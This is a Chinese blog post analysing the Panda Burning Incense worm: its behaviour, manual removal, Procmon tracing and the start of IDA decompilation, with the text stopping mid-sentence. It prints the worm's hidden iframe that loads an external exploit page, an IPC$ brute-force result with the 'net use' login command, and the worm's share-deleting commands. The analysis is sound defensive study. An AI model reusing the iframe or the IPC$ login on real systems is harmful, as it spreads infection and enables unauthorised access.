    <content type="html"><![CDATA[<p>熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 <a href="https://v5le0n9.github.io/posts/adc1352a.html">Windows PE病毒分类及感染方式</a> 。</p><p>熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。</p><span id="more"></span><h1 id="1-熊猫烧香的前因后果"><a href="#1-熊猫烧香的前因后果" class="headerlink" title="1. 熊猫烧香的前因后果"></a>1. 熊猫烧香的前因后果</h1><p>熊猫烧香(Worm.WhBoy)是一款拥有自动传播、自动感染硬盘能力和强大的破坏能力的病毒，它不但不能感染系统中的EXE、COM、PIF、SRC、HTML、ASP等文件，还能中止大量的反病毒软件进程，并且会删除扩展名为gho的文件，是系统备份工具GHOST的备份文件。被感染的用户系统中所有EXE文件的图标全部被改成熊猫烧香。</p><p>2006年10月16日由25岁的湖北武汉李俊编写，2007年1月初肆虐网络，主要通过下载的文件传染传播。</p><p>熊猫烧香的破坏力远大于其技术含量，尤其是对网络信息安全产生深远的影响，毕竟它是第一个让中国普通用户对木马病毒有所认识和感知的。从现在的技术角度看，熊猫烧香病毒技术水平一般，但病毒作者在当时运用的各类技术手法还是值得参考和借鉴的。</p><ul><li>首先它可以感染EXE文件，也可以将扩展名为gho的文件删除</li><li>其次是将源病毒感染到Web文件，使网页成为它传播的介质</li><li>然后在传播层面，病毒作者使用众多传播途径</li><li>最后是具备一定的对抗杀软能力</li></ul><p>熊猫病毒如果是放在现在，这些基本都是所有病毒木马常见、必备的技术，但技术不可同日而语。随着人工智能、大数据、云计算、区块链等先进技术不断发展，病毒作者也将这些技术手段运用到各类安全攻击中危害用户。典型的包括：</p><ul><li>勒索病毒：在2017年5月12日，一款名为WannaCry勒索病毒通过MS17-010漏洞在全球范围大爆发，感染了大量计算机。此后，Petya、Bad Rabbit、Globelmposter等勒索病毒相继对企业及机构发起攻击。</li><li>挖矿木马：伴随着比特币等虚拟数字货币交易火爆的同时，越来越多的人利用数字虚拟币交易大发横财，吸引大量黑产从业人员进入挖矿产业，这也是为什么2017年之后披露的挖矿木马攻击事件数量呈现出爆发式的增长。</li><li>APT攻击：当前鱼叉攻击、水坑攻击、远程可执行漏洞和密码爆破攻击等手段依然是APT攻击的最主要方式。未来，Fileless攻击、将通信的C&amp;C服务器存放在公开的社交网站上、使用公开或者开源工具、多平台攻击和跨平台攻击将成APT攻击技术的主要发展趋势。</li><li>IoT攻击：黑客通常通过设备弱口令或者远程命令执行漏洞对IoT设备进行攻击，攻击者通过蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络，IoT设备成为了黑客最新热爱的武器。</li></ul><p>除此之外，供应链攻击、AI对抗样本、视频语音欺骗等攻击延伸都是未来黑客技术的发展趋势，这些都应该引起我们足够的重视。</p><h1 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2. 样本行为分析"></a>2. 样本行为分析</h1><p>熊猫烧香有它的特殊性，也有它的通用性。</p><h2 id="2-1-自启动方式"><a href="#2-1-自启动方式" class="headerlink" title="2.1 自启动方式"></a>2.1 自启动方式</h2><ul><li><p>熊猫烧香病毒将自身拷贝至系统目录，同时修改注册表将自身设置为开机启动项。</p><p>这种方式也是绝大部分病毒自启动所采用的方式。</p></li><li><p>拷贝自身到所有驱动器根目录(盘符)，命名为<code>setup.exe</code>，在驱动器根目录生成<code>autorun.inf</code>文件，并把它设置为隐藏、只读、系统。</p><p><code>autorun.inf</code>文件的作用是允许在双击磁盘时自动运行指定的某个文件，即运行<code>setup.exe</code>。</p></li></ul><p>注意，该<code>setup.exe</code>文件被设置为隐藏、只读、系统，虽然我们可以查看“隐藏的项目”，但某些隐藏的系统文件仍然是看不到的。</p><img src="/posts/a48809a5/2.1.1.png" class="" title="隐藏的项目"><p>我们需要进一步设置，取消勾选“隐藏保护的操作系统文件”，才能显示这类文件，如下图所示。而通常设置为隐藏的系统文件是较难被觉察的，尤其当这类文件被写入到某个指定的操作系统目录中，防不胜防。</p><img src="/posts/a48809a5/2.1.2.png" class="" title="隐藏的系统文件"><h2 id="2-2-感染与传播方式"><a href="#2-2-感染与传播方式" class="headerlink" title="2.2 感染与传播方式"></a>2.2 感染与传播方式</h2><ul><li><p>感染可执行文件</p><p>熊猫烧香病毒会搜索并感染系统中特定目录外的所有EXE / SCR / PIF / COM等文件，将自身捆绑在被感染文件前端，并在尾部添加标记信息：<code>.WhBoy&#123;原文件名&#125;.exe.&#123;原文件大小&#125;</code>。注意，它感染的是特定目录外的，而某些系统目录是不去感染的，因为Windows系统某些可执行文件是有还原机制的，系统文件修改有时候会有报警提示。</p></li><li><p>感染网页</p><p>熊猫烧香病毒会查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件，在里面插入网页标记，这个帧iframe会将另外一个URL嵌入到当前网页，并且宽度和高度设置为0（看不到）。嵌入页面后会利用如IE浏览器的漏洞来触发恶意代码，从而释放相应病毒出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.ac86.cn/66/index.htm</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通过弱口令传播</p><p>这种传播方式非常普遍，它会访问局域网共享文件夹将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>（模拟游戏名称）；通过弱口令猜测从而进入系统C盘。</p></li></ul><h2 id="2-3-自我隐藏"><a href="#2-3-自我隐藏" class="headerlink" title="2.3 自我隐藏"></a>2.3 自我隐藏</h2><ul><li><p>禁用安全软件</p><p>熊猫烧香病毒会尝试关闭安全软件（杀毒软件、防火墙、安全工具）的窗口、进程，比如包含360的名称等；删除注册表中安全软件的启动项；禁用安全软件的服务等操作。</p></li><li><p>自动恢复“显示所有文件和文件夹”选项隐藏功能</p><p>某些用户去看隐藏文件，会主动点击查看隐藏文件夹，但这个病毒会自动恢复隐藏。</p></li><li><p>删除系统的隐藏共享（net share）</p><p>Windows系统其实默认会开启隐藏共享 C$ ，比如早期的 IPC$ 管道等，通过net share命令可以删除隐藏共享。</p></li></ul><p>在未经授权的情况下很难将木马拷贝到别人的电脑上，这里需要利用 IPC$ 漏洞，调用445端口号实现。445端口中有个 IPC$  ，称之为空连接，没有固定文件夹的共享；而 C$ 、D$ 、E$ 代表分区共享，是有固定文件夹的。换句话说，445端口打开就相当于我们可以在局域网中轻松访问各种共享文件夹，如果您的电脑是弱密码，很容易就被攻破，这里使用 IPC$ 暴力爆破。</p><p>IPC$ (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$ 是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。NT2000在提供了 IPC$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$ 、D$ 、E$、…)和系统目录(C:\windows)共享。所有的这些初衷都是为了方便管理员的管理，但好的初衷并不一定有好的收效，一些别有用心者会利用IPC$访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。</p><p>下图展示了使用NTscan软件暴力爆破，该软件支持远程连接 IPC$ 和利用字典文件。运行软件，输入IP地址“10.1.1.2”，选择IPCscan连接共享“IPC$”，成功获取了密码“123.com”。</p><img src="/posts/a48809a5/2.3.1.png" class="" title="NTScan暴力破解"><p>接着与目标主机建立 IPC$ 空连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.1.2\ipc$ 123.com /user:administrator</span><br></pre></td></tr></table></figure><h2 id="2-4-破坏功能"><a href="#2-4-破坏功能" class="headerlink" title="2.4 破坏功能"></a>2.4 破坏功能</h2><ul><li><p>熊猫烧香病毒同时会开另一个线程连接某网站下载DDOS程序进行发动恶意攻击</p><p>具有破坏功能，可开启附件攻击行为，熊猫烧香感染计算机台数非常多，它就能发动多台电脑发起DDOS攻击。</p></li><li><p>删除扩展名为gho的文件，延长存活时间</p><p>该文件是系统备份工具GHOST的备份文件，从而使用户的系统备份文件丢失。当用户中了病毒，想去恢复时就存在困难了。</p></li></ul><p>这就是一个典型的病毒案例，现在很多病毒功能都具有相似性，它们有经济利益趋势。当然对于不同的病毒来说，如果它们的目的不一样，其行为会存在很大差异。熊猫烧香病毒的隐蔽性不是很好，每一个感染者都会知道自己已被感染。</p><h1 id="3-样本运行及查杀防御"><a href="#3-样本运行及查杀防御" class="headerlink" title="3. 样本运行及查杀防御"></a>3. 样本运行及查杀防御</h1><p>手动查杀病毒基本流程如下：</p><ul><li><p>排查可疑进程</p><p>因为病毒往往会创建出来一个或者多个进程，因此需要分辨出哪些进程是由病毒所创建，然后删除可疑进程。</p></li><li><p>检查启动项</p><p>病毒为了实现自启动，会采用一些方法将自己添加到启动项中，从而实现自启动，所以我们需要把启动项中的病毒清除。</p></li><li><p>删除病毒</p><p>在上一步的检查启动项中，我们就能够确定病毒主体的位置，这样就可以顺藤摸瓜，从根本上删除病毒文件。</p></li><li><p>修复被病毒破坏的文件</p><p>这一步一般来说无法直接通过纯手工完成，需利用相应的软件，不是我们讨论的重点。</p></li></ul><p>为什么计算机中安装了杀毒软件，还要去手动查杀呢？</p><p>因为杀毒软件存在严重的滞后性，必须要等病毒工程师抓取对应样本，并进行分析总结病毒的特征码，再加入杀软病毒库后才能识别病毒，但病毒会存在各种变种，因此手动查杀也是必要的。同时，这对反病毒工程师来说也是认识和熟悉病毒的过程，在技术上是非常必要的。这也是现在为什么很多云沙箱、云杀软、动态更新的技术不断出现。</p><h2 id="3-1-排查可疑进程"><a href="#3-1-排查可疑进程" class="headerlink" title="3.1 排查可疑进程"></a>3.1 排查可疑进程</h2><p>运行病毒前打开任务管理器观察此时打开的进程。</p><img src="/posts/a48809a5/3.1.1.png" class="" title="当前任务管理器进程"><img src="/posts/a48809a5/3.1.2.png" class="" title="当前任务管理器进程"><p>运行熊猫烧香样本，可以发现任务管理器就自动关闭，并且无法再次打开（总一闪而过）。那么，我们怎么查看系统中的进程呢？打开CMD命令提示符，输入命令“tasklist”查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [版本 6.1.7601]</span><br><span class="line">版权所有 (c) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Leong&gt;tasklist</span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话#       内存使用</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0        612 K</span><br><span class="line">smss.exe                       244 Services                   0        796 K</span><br><span class="line">csrss.exe                      332 Services                   0      4,228 K</span><br><span class="line">csrss.exe                      384 Console                    1     19,856 K</span><br><span class="line">wininit.exe                    392 Services                   0      3,904 K</span><br><span class="line">winlogon.exe                   428 Console                    1      5,748 K</span><br><span class="line">services.exe                   488 Services                   0      7,028 K</span><br><span class="line">lsass.exe                      496 Services                   0      7,744 K</span><br><span class="line">lsm.exe                        512 Services                   0      4,508 K</span><br><span class="line">svchost.exe                    596 Services                   0      7,060 K</span><br><span class="line">svchost.exe                    672 Services                   0      6,208 K</span><br><span class="line">svchost.exe                    764 Services                   0     13,072 K</span><br><span class="line">svchost.exe                    808 Services                   0      8,620 K</span><br><span class="line">svchost.exe                    840 Services                   0     26,444 K</span><br><span class="line">svchost.exe                    980 Services                   0     10,328 K</span><br><span class="line">svchost.exe                   1048 Services                   0     12,412 K</span><br><span class="line">spoolsv.exe                   1200 Services                   0      8,544 K</span><br><span class="line">svchost.exe                   1228 Services                   0     10,708 K</span><br><span class="line">httpd.exe                     1332 Services                   0     17,104 K</span><br><span class="line">VGAuthService.exe             1444 Services                   0      7,248 K</span><br><span class="line">taskhost.exe                  1548 Console                    1      7,620 K</span><br><span class="line">dwm.exe                       1604 Console                    1     58,972 K</span><br><span class="line">explorer.exe                  1612 Console                    1     57,228 K</span><br><span class="line">httpd.exe                     1740 Services                   0     17,272 K</span><br><span class="line">vmtoolsd.exe                  1792 Services                   0     15,804 K</span><br><span class="line">svchost.exe                   1432 Services                   0      4,768 K</span><br><span class="line">vm3dservice.exe               1496 Console                    1      3,664 K</span><br><span class="line">vmtoolsd.exe                  1480 Console                    1     20,996 K</span><br><span class="line">jusched.exe                   2140 Console                    1      4,040 K</span><br><span class="line">ApacheMonitor.exe             2224 Console                    1      3,584 K</span><br><span class="line">dllhost.exe                   2244 Services                   0      8,788 K</span><br><span class="line">msdtc.exe                     2408 Services                   0      6,272 K</span><br><span class="line">WmiPrvSE.exe                  2660 Services                   0     11,264 K</span><br><span class="line">SearchIndexer.exe             2692 Services                   0     34,036 K</span><br><span class="line">svchost.exe                   3296 Services                   0      3,712 K</span><br><span class="line">sppsvc.exe                    3332 Services                   0      7,360 K</span><br><span class="line">svchost.exe                   3368 Services                   0      6,296 K</span><br><span class="line">audiodg.exe                   2384 Services                   0     14,140 K</span><br><span class="line">SearchProtocolHost.exe        3744 Services                   0      6,240 K</span><br><span class="line">SearchFilterHost.exe          4084 Services                   0      4,204 K</span><br><span class="line">spoclsv.exe                   2268 Console                    1      5,960 K</span><br><span class="line">cmd.exe                       3252 Console                    1      2,640 K</span><br><span class="line">conhost.exe                   2348 Console                    1      6,880 K</span><br><span class="line">tasklist.exe                  2968 Console                    1      4,492 K</span><br></pre></td></tr></table></figure><p>重点关注会话值为1的进程，发现<code>spoclsv.exe</code>、<code>cmd.exe</code>、<code>conhost.exe</code>、<code>tasklist.exe</code>都没出现过。<code>cmd.exe</code>和<code>tasklist.exe</code>都是我们操作过的命令，可以不管。百度<code>conhost.exe</code>是命令行程序的宿主进程，非病毒木马；<code>spoclsv.exe</code>是熊猫烧香病毒相关程序。</p><p>输入以下命令强制结束进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im 2268#强制结束PID为2268的进程</span><br></pre></td></tr></table></figure><p>其中“/f”表示强制执行，“/im”表示文件镜像，“2268”对应PID值。注意，使用普通用户执行命令不能结束该进程，需使用管理员权限。</p><img src="/posts/a48809a5/3.1.3.png" class="" title="终止spoclsv.exe"><p>此时，任务管理器又可以打开了。</p><h2 id="3-2-检查启动项"><a href="#3-2-检查启动项" class="headerlink" title="3.2 检查启动项"></a>3.2 检查启动项</h2><p>排查可疑进程之后，接下来查询启动项，徽标键 + R -&gt; 输入msconfig。显示如下图所示，可以看到“svcshare”启动项。命令为<code>C:\WINDOWS\System32\drivers\spoclsv.exe</code>，位置在<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>。</p><img src="/posts/a48809a5/3.2.1.png" class="" title="样本启动项"><p>徽标键 + R -&gt; 输入regedit，打开注册表。在注册表搜索“svcshare”找到了它，也就是说这个病毒也会写进注册表里，启动对应的EXE程序。</p><img src="/posts/a48809a5/3.2.2.png" class="" title="写入注册表"><p>先将病毒的启动项取消，回到系统配置中取消勾选“svcshare”启动项，暂不重新启动计算机。</p><img src="/posts/a48809a5/3.2.4.png" class="" title="写入注册表"><p>回到注册表中看，病毒写入注册表的信息已经消失了，说明启动项已经成功被删除。</p><img src="/posts/a48809a5/3.2.5.png" class="" title="写入注册表"><h2 id="3-3-删除病毒"><a href="#3-3-删除病毒" class="headerlink" title="3.3 删除病毒"></a>3.3 删除病毒</h2><p>对于病毒程序，我们要使用强制删除。同样，用管理员权限打开命令窗口，进入到病毒所在目录，执行以下命令强制删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del /f spoclsv.exe</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/3.3.1.png" class="" title="强制删除病毒"><p>但这还没有结束，该病毒还将自身复制到每一个磁盘的根目录下。在C盘根目录下查看隐藏、只读、系统文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /ah</span><br></pre></td></tr></table></figure><p>根据样本行为分析中的自启动方式看，<code>autorun.inf</code>和<code>setup.exe</code>都是这个病毒带过来的。所以要将它们强制删除。</p><img src="/posts/a48809a5/3.3.2.png" class="" title="强制删除病毒"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del /ah /f antorun.inf</span><br><span class="line">del /ah /f setup.exe</span><br></pre></td></tr></table></figure><p>注意，是每一个磁盘都要删除<code>autorun.inf</code>和<code>setup.exe</code>。</p><img src="/posts/a48809a5/3.3.3.png" class="" title="强制删除病毒"><p>重启系统后，所有手动查杀病毒的工作完毕，我们的系统就又恢复正常了。</p><h1 id="4-Procmon检测病毒行为"><a href="#4-Procmon检测病毒行为" class="headerlink" title="4. Procmon检测病毒行为"></a>4. Procmon检测病毒行为</h1><h2 id="4-1-软件介绍"><a href="#4-1-软件介绍" class="headerlink" title="4.1 软件介绍"></a>4.1 软件介绍</h2><p>Process Monitor是微软推荐的一款系统监视工具，能够实时显示文件系统、注册表（读写）、网络连接与进程活动的高级工具。它整合了旧的Sysinternals工具、Filemon与Regmon，其中Filemon专门用来监视系统中的任何文件操作过程，Regmon用来监视注册表的读写操作过程。同时，Process Monitor增加了进程ID、用户、进程可靠度等监视项，可以记录到文件中。</p><p>总的来说，Process Monitor可以帮助使用者对系统中的任何文件、注册表操作进行监视和记录，通过注册表和文件读写的变化，有效帮助诊断系统故障或发现恶意软件、病毒及木马。</p><img src="/posts/a48809a5/4.1.1.png" class="" title="Procmon界面"><h2 id="4-2-病毒行为检测"><a href="#4-2-病毒行为检测" class="headerlink" title="4.2 病毒行为检测"></a>4.2 病毒行为检测</h2><p>打开Procmon，Filter -&gt; Filter(快捷键Ctrl + L)，添加过滤病毒名称<code>setup.exe</code>。</p><img src="/posts/a48809a5/4.2.1.png" class="" title="添加过滤病毒"><p>运行熊猫烧香<code>setup.exe</code>，可以看到Procmon捕获了非常多的病毒信息。</p><img src="/posts/a48809a5/4.2.2.png" class="" title="捕获病毒行为"><p>Tools -&gt; Process Tree(快捷键Ctrl + T)，查看病毒的进程树。</p><img src="/posts/a48809a5/4.2.3.png" class="" title="查看病毒进程树"><p>可以看到<code>setup.exe</code>的熊猫烧香病毒程序，并衍生出一个<code>spoclsv.exe</code>程序。位置信息为：<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>。</p><p>发现<code>spoclsv.exe</code>程序两次打开cmd，运行“net share”命令删除各个磁盘共享及系统根目录共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share C$ /del /y#删除C盘下的默认共享</span><br><span class="line">net share admin$ /del /y#删除C:\WINDOWS远程管理</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/4.2.4.png" class="" title="删除磁盘共享和根目录共享"><p>回到Procmon继续深入分析，关闭其它结果，只剩下注册表行为。</p><img src="/posts/a48809a5/4.2.5.png" class="" title="只显示注册表行为"><p>接着在过滤器中仅筛选对注册表修改的值，如下图所示。</p><img src="/posts/a48809a5/4.2.6.png" class="" title="筛选对注册表的修改"><img src="/posts/a48809a5/4.2.7.png" class="" title="筛选对注册表的修改"><p>主要修改的是Seed项，就是随机数种子的生成。但仅仅通过这个信息无法推测注册表的行为，所以该病毒对注册表并没有造成什么实质性影响。</p><p>在过滤器中删除注册表的修改，然后检测熊猫烧香病毒是否创建文件，创建文件也是病毒的重要手段。</p><img src="/posts/a48809a5/4.2.8.png" class="" title="筛选创建文件"><p>可以看到主要创建的文件是<code>C:\WINDOWS\system32\drivers</code>目录下，其它并没有特别的东西。所以<code>setup.exe</code>程序对我们的系统并没有实质性影响，主要影响还是<code>spoclsv.exe</code>程序，所以下一步操作就是监控<code>spoclsv.exe</code>程序。</p><img src="/posts/a48809a5/4.2.9.png" class="" title="监控spoclsv.exe"><p>重置过滤器，设置对<code>spoclsv.exe</code>程序的监控。在过滤器中查看<code>spoclsv.exe</code>删除注册表选项。</p><img src="/posts/a48809a5/4.2.10.png" class="" title="筛选删除注册表"><img src="/posts/a48809a5/4.2.11.png" class="" title="筛选删除注册表"><p>从这些名称可以看出它们都是常用的杀毒软件名称，其位置是CurrentVersion的Run下面，也就是将杀毒软件的自启动项全部删除。</p><p>在过滤器中查看<code>spoclsv.exe</code>创建及设置的注册表键值。</p><img src="/posts/a48809a5/4.2.12.png" class=""><p>显示结果如下图所示，病毒设置了自启动项，要启动的本体是drivers目录下的<code>spoclsv.exe</code>。继续查看，发现它对文件实现隐藏，设置该值后，即使我们在文件夹选项中选择显示所有文件和文件夹，也无法显示隐藏文件。</p><img src="/posts/a48809a5/4.2.13.png" class="" title="设置自启动项和实现文件隐藏"><p>只显示<code>spoclsv.exe</code>的文件系统行为。</p><p>熊猫烧香病毒创建文件包括：</p><ul><li>在<code>C:\WINDOWS\system32\drivers</code>中创建<code>spoclsv.exe</code></li><li>磁盘根目录创建<code>setup.exe</code>与<code>autorun.inf</code></li><li>某些目录中创建<code>Desktop_.ini</code>文件</li></ul><img src="/posts/a48809a5/4.2.14.png" class="" title="监控文件系统行为"><p>由于创建这些文件之后就对注册表的SHOWALL项进行了设置，使得隐藏文件无法显示，那么有理由相信，所创建出来的这些文件的属性都是“隐藏”的。</p><p>查看<code>spoclsv.exe</code>的网络行为。从监控结果可以看到，病毒会向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包。</p><img src="/posts/a48809a5/4.2.14.png" class="" title="监控网络行为"><p>综上所述，可以总结熊猫烧香的几个行为：</p><ol><li>在<code>C:\WINDOWS\system32\drivers</code>目录创建<code>spoclsv.exe</code>程序</li><li>命令行模式下使用“net share”解除共享功能</li><li>删除安全类软件在注册表中自启动项</li><li>在注册表<code>CurrentVersion\Run</code>创建<code>svcshare</code>自启动项，每次开机时会自动运行病毒</li><li>禁用文件夹隐藏选项，修改注册表使得隐藏文件无法通过普通设置显示，从而隐藏病毒自身</li><li>将自身拷贝到每个磁盘的根目录下并命名为<code>setup.exe</code>，创建<code>autorun.inf</code>用于病毒的启动，这两个文件的属性都是“隐藏”。同时，会创建<code>Desktop_.ini</code>隐藏文件</li><li>向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包</li></ol><p>我们已经基本分析了熊猫烧香的病毒行为，但这些行为仍然无法彻底了解病毒的行为，还需要通过OllyDbg逆向分析和IDA静态分析来实现。同时，熊猫烧香病毒还有一些其他的行为，包括：</p><ul><li>感染EXE文件，病毒会搜索并感染系统中特定目录外的所有EXE/SCR/PIF/COM文件，并将EXE执行文件的图标改为熊猫烧香的图标。</li><li>试图用以弱口令访问局域网共享文件夹，如果发现弱口令共享，就将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>，以达到通过局域网传播的功能。</li><li>查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件并在里面插入iframe，该网页中包含在病毒程序，一旦用户使用了未安装补丁的IE浏览器访问该网页就可能感染该病毒。</li><li>删除扩展名为gho的文件，该文件是系统备份工具GHOST的备份文件，这样可使用户的系统备份文件丢失。</li></ul><h1 id="5-动静结合分析样本——病毒初始化"><a href="#5-动静结合分析样本——病毒初始化" class="headerlink" title="5. 动静结合分析样本——病毒初始化"></a>5. 动静结合分析样本——病毒初始化</h1><p>栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p><p>在分析病毒之前，首先需要调用工具检查病毒是否带壳，如果带壳还需要先进行脱壳操作。程序无壳，采用Borland Delphi 6.0-7.0编写的32位EXE文件。</p><img src="/posts/a48809a5/5.1.1.png" class="" title="查壳"><p>先将样本载入IDA，查看伪代码。</p><img src="/posts/a48809a5/5.1.2.png" class="" title="主函数伪代码"><img src="/posts/a48809a5/5.1.3.png" class="" title="主函数伪代码"><p>由于我第一次分析样本，所以这个样本我会事无巨细地分析，看看我能分析到什么程度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>样本主函数的第1行代码，<code>__noreturn</code>关键字，顾名思义，不返回，表明调用完成后函数不返回主调函数。注意，这与 void 返回类型不同。void 类型的函数在执行完毕后返回主调函数，只是它不提供返回值。这太容易理解了，因为<code>start()</code>本身就是主调函数，还能返回到哪里去？</p><p>第17行代码的<code>sub_40CA98()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_40CA98</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">int</span> a8, <span class="type">int</span> a9, <span class="type">int</span> a10, <span class="type">int</span> a11, <span class="type">int</span> a12, <span class="type">int</span> a13, <span class="type">int</span> a14, <span class="type">int</span> a15, <span class="type">int</span> a16)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr[<span class="number">2</span>]; <span class="comment">// [sp+0h] [bp+0h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> MK_FP(retaddr[<span class="number">0</span>], retaddr[<span class="number">0</span>])(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__stdcall</code>是<strong>函数调用约定</strong>的一种，它的主要特征是：</p><ul><li>参数都是<strong>从右向左通过堆栈传递</strong>的</li><li>函数的<strong>堆栈平衡操作是由被调用函数执行</strong>的，比如函数调用在返回前要由被调用函数清理堆栈</li><li>在函数名的前面用下划线修饰，在函数名的后面由@来修饰并加上栈需要的字节数的空间，比如<code>_sumExample@8</code></li></ul><p>函数调用约定主要约束了两件事：</p><ol><li>参数的传递顺序</li><li>调用堆栈由谁(调用函数或被调用函数)清理</li></ol><p>常见的函数调用约定有：<code>__stdcall</code>、<code>__cdecl</code>、<code>__fastcall</code>、<code>__thiscall</code>、<code>__nakedcall</code>、<code>__passcal</code>、<code>__vectorcall</code>。</p><p>在<code>sub_40CA98()</code>中，传入了16个整型变量，在压栈过程中，顺序应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push a16</span><br><span class="line">push a15</span><br><span class="line">...</span><br><span class="line">push a1</span><br></pre></td></tr></table></figure><p>最后也是由<code>sub_40CA98()</code>函数pop这16个整型变量。</p><p>双击该函数中的<code>void *retaddr[2];</code>弹出一个<code>Stack of sub_40CA98</code>窗口，对该定义变量进行了一些说明。</p><img src="/posts/a48809a5/5.1.4.png" class="" title="Stack of sub_40CA98"><p>“*”表示一个数组。使用数据定义命令创建局部变量和函数参数。两个特殊字段“r”和“s”表示返回地址和保存的寄存器。</p><p><code>void *retaddr[2];</code>表示定义了一个有2个元素的数组，它的BP(基址指针寄存器)从偏移为0开始，SP(堆栈指针寄存器)从偏移为0开始。</p><p><code>MK_FP</code>是一个宏，功能是做段基址加上偏移地址的运算，也就是取实际地址。其函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MK_FP( seg,ofs )( (void _seg * )( seg ) +( void near * )( ofs ))</span></span><br></pre></td></tr></table></figure><p>在该函数中，<code>MK_FP</code>如果想要<code>retaddr[]</code>作为参数传入，<code>MK_FP</code>第1个括号中的两个参数都应该填数组的首地址(因为seg=[BP+0]，刚好是数组的首地址；ofs=[SP+0]，也是数组的首地址)。后面跟着的参数的偏移地址在此基础上往上递增。</p><p>鼠标移到变量a1会发现它的偏移为[BP+8] 